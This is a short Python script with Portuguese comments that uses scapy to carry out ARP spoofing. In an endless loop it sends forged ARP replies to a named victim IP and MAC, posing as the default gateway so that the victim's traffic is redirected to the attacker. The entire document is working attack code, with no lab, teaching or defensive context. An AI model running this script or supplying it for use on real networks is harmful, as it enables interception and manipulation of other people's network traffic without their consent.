# redirecionar o tráfego por meio de enganar um dispositivo ao alterar o MAC relacionado ao gateway padrão. 

from scapy.all import ARP, Ether, sendp
import time

def arp_spoof(target_ip, target_mac, spoof_ip):
    """
    Enviar um pacote ARP falso para o target_ip, dizendo que o spoof_ip está no nosso MAC.
    """
    packet = Ether(dst=target_mac) / ARP(op=2, psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
    sendp(packet, verbose=False)

target_ip = "192.168.1.10"  # IP da vítima
target_mac = "AA:BB:CC:DD:EE:FF"  # MAC da vítima
gateway_ip = "192.168.1.1"  # IP do roteador/gateway

while True:
    arp_spoof(target_ip, target_mac, gateway_ip)
    time.sleep(10)
